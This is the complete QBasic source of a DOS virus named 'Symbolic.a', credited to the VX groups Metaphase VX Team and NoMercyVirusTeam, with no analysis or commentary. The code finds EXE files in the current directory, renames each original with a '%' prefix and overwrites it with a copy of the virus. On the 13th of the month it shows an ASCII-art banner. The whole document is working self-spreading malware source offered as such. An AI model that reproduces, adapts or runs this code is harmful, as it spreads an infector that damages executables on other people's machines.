ON ERROR GOTO Vpay
'########################################################
'## [Symbolic.a]                                       ##
'## by  -KD- [Metaphase VX Team] & [NoMercyVirusTeam]  ##
'########################################################
Lvir = 34384
Vroot$ = "SYM.EXE"
SHELL "DIR *.EXE>KD"
OPEN "R", 1, "KD", 32767
GET #1, 1
LINE INPUT #1, Org$
LINE INPUT #1, Org$
LINE INPUT #1, Org$
LINE INPUT #1, Org$
OnErrors: ON ERROR GOTO Vpay
CLOSE #2
F = 1: LINE INPUT #1, Org$
IF MID$(Org$, 1, 1) = "%" THEN GOTO OnErrors
Org$ = MID$(Org$, 1, 13)
Exts$ = MID$(Org$, 9, 13)
MID$(Exts$, 1, 1) = "."
AddIt: F = F + 1
IF MID$(Org$, F, 1) = " " OR MID$(Org$, F, 1) = "." OR F = 13 THEN GOTO GetExts:
GOTO AddIt
GetExts: Org$ = MID$(Org$, 1, F - 1) + Exts$
ON ERROR GOTO OnErrors:
TEST$ = ""
OPEN "R", 2, Org$, Lvir
IF LOF(2) < Lvir THEN GOTO CloseIt
GET #2, 2
LINE INPUT #1, TEST$
CloseIt: CLOSE #2
CLOSE #1
Orgs$ = Org$
MID$(Orgs$, 1, 1) = "%"
C$ = "COPY " + Org$ + " " + Orgs$
SHELL C$
C$ = "COPY " + Vroot$ + Org$
SHELL C$
OPEN Org$ FOR APPEND AS #1 LEN = 13
WRITE #1, Orgs$
CLOSE #1
KILL "KD"
DT$ = DATE$
day$ = MID$(DT$, 4, 2)
ON ERROR GOTO Exxt
Vpay:
IF day$ = "13" THEN OPEN "SYM.TXT" FOR OUTPUT AS #6
IF day$ = "13" THEN PRINT 6#, "   ÖÄ¿ Ò  Â ÖÄÒÄ¿ ÒÄ¿  ÖÄÄ¿ Ò    ÄÒÄ ÖÄÄ¿"
IF day$ = "13" THEN PRINT 6#, "   ÓÄ¿ ÓÄÄ´ º º ³ ÇÄÁ¿ º  ³ º     º  º"
IF day$ = "13" THEN PRINT 6#, "  ÓÄÄÙ ÓÄÄÙ Ð Ð Á ÐÄÄÙ ÓÄÄÙ ÐÄÄÙ ÄÐÄ ÓÄÄÙ"
IF day$ = "13" THEN PRINT 6#, "-KD- [Metaphase VX Team] & [NoMercyVirusTeam]"
IF day$ = "13" THEN PRINT 6#, "            Special Greets To FS"
IF day$ = "13" THEN CLOSE #6
IF day$ = "13" THEN SHELL "TYPE SYM.TXT"
IF day$ = "13" THEN KILL "SYM.TXT"
IF day$ = "13" THEN BEEP
Exxt: SYSTEM
exits: PRINT "Erorr at 0S0Y0M0B0O0L0I0C0": SYSTEM
END






